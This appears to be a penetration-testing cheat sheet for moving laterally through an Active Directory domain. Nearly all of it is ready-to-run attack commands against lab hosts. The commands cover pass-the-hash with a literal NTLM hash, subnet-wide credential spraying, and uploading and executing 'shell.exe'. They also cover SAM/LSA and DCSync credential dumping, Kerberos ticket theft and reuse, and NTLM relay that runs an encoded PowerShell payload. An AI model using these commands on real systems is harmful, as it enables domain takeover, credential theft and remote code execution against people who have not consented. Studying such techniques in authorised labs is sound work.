---
layout: page
title: "AD Lateral Movement"
---

# AD Lateral Movement

Remote execution across AD-joined hosts using credentials or tickets. These are the Impacket tools you run from Kali and the CrackMapExec one-liners for bulk operations. For Windows-native techniques (WMI, PSRemoting, DCOM, RDP) see [Windows Lateral Movement](../windows-lateral-movement/).

## Impacket: Single Host Execution

```shell
# PsExec: uploads a service binary, reliable, noisy
impacket-psexec corp1/admin:lab@192.168.1.10
impacket-psexec corp1/admin@192.168.1.10 -hashes :2892D26CDF84D7A70E2EB3B9F05C425E
impacket-psexec corp1/admin@192.168.1.10 -hashes :HASH "whoami"

# WMIExec: no service created, semi-interactive
impacket-wmiexec corp1/admin:lab@192.168.1.10
impacket-wmiexec corp1/admin@192.168.1.10 -hashes :HASH
impacket-wmiexec corp1/admin@192.168.1.10 -hashes :HASH "hostname"

# SMBExec: uses service but no binary on disk
impacket-smbexec corp1/admin:lab@192.168.1.10
impacket-smbexec corp1/admin@192.168.1.10 -hashes :HASH

# ATExec: task scheduler, single command, output to file
impacket-atexec corp1/admin:lab@192.168.1.10 "whoami"
impacket-atexec corp1/admin@192.168.1.10 -hashes :HASH "net user"
```

## Evil-WinRM (WinRM, port 5985)

```shell
evil-winrm -i 192.168.1.10 -u admin -p lab
evil-winrm -i 192.168.1.10 -u admin -H 2892D26CDF84D7A70E2EB3B9F05C425E

# File transfer (inside session)
upload /kali/tool.exe C:\Windows\Temp\tool.exe
download C:\Windows\Temp\output.txt /kali/output.txt

# Load PowerShell scripts on connect
evil-winrm -i 192.168.1.10 -u admin -p lab -s /kali/scripts/
```

## CrackMapExec: Bulk Operations

```shell
# Spray credentials across subnet
crackmapexec smb 192.168.1.0/24 -u admin -p lab --continue-on-success
crackmapexec smb 192.168.1.0/24 -u admin -H HASH --continue-on-success

# Execute command
crackmapexec smb 192.168.1.10 -u admin -p lab -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -H HASH -x "net user"
crackmapexec smb 192.168.1.10 -u admin -p lab -X "Get-Process"   # PowerShell

# Upload and execute
crackmapexec smb 192.168.1.10 -u admin -p lab --put-file ./shell.exe C:\\Windows\\Temp\\shell.exe
crackmapexec smb 192.168.1.10 -u admin -p lab -x "C:\\Windows\\Temp\\shell.exe"

# Dump SAM/LSA
crackmapexec smb 192.168.1.10 -u admin -p lab --sam
crackmapexec smb 192.168.1.10 -u admin -p lab --lsa

# Enumerate shares, sessions, logged-on users
crackmapexec smb 192.168.1.10 -u admin -p lab --shares
crackmapexec smb 192.168.1.10 -u admin -p lab --sessions
crackmapexec smb 192.168.1.10 -u admin -p lab --loggedon-users
```

## Kerberos Ticket Movement

```shell
# Pass-the-Ticket from Kali (with ccache)
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec -k -no-pass corp1.com/admin@dc01.corp1.com
impacket-wmiexec -k -no-pass corp1.com/admin@appsrv01.corp1.com
impacket-secretsdump -k -no-pass dc01.corp1.com

# Overpass-the-Hash: get TGT from NTLM hash
impacket-getTGT corp1.com/admin -hashes :2892D26CDF84D7A70E2EB3B9F05C425E
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass corp1.com/admin@dc01.corp1.com
```

```powershell
# Inject ticket (Windows)
.\Rubeus.exe ptt /ticket:base64_or_file.kirbi
klist

# Export ticket for use elsewhere
.\Rubeus.exe dump /user:admin /service:krbtgt /nowrap
.\Rubeus.exe triage
```

## DCSync (from Kali)

```shell
# Requires Domain Admin or explicit DCSync rights
impacket-secretsdump corp1/admin:lab@192.168.1.5
impacket-secretsdump corp1/admin@192.168.1.5 -hashes :HASH

# Specific accounts
impacket-secretsdump corp1/admin:lab@192.168.1.5 -just-dc-user krbtgt
impacket-secretsdump corp1/admin:lab@192.168.1.5 -just-dc-ntlm
```

## NTLM Relay

```shell
# Find hosts without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt

# Start relay
impacket-ntlmrelayx -tf nosigning.txt -smb2support
impacket-ntlmrelayx -tf nosigning.txt -smb2support -c "powershell -enc <base64>"

# Capture with Responder (on a separate interface)
sudo responder -I eth0 -wrf
```

## Useful One-Liners

```shell
# Verify local admin across a list of targets
crackmapexec smb targets.txt -u admin -H HASH

# SMB shares with guest
crackmapexec smb 192.168.1.0/24 -u '' -p '' --shares 2>/dev/null | grep READ

# Check WinRM access
crackmapexec winrm 192.168.1.0/24 -u admin -p lab

# RPC enumeration
impacket-rpcdump 192.168.1.10 | grep -i mssql
impacket-lookupsid corp1/admin:lab@192.168.1.10
```
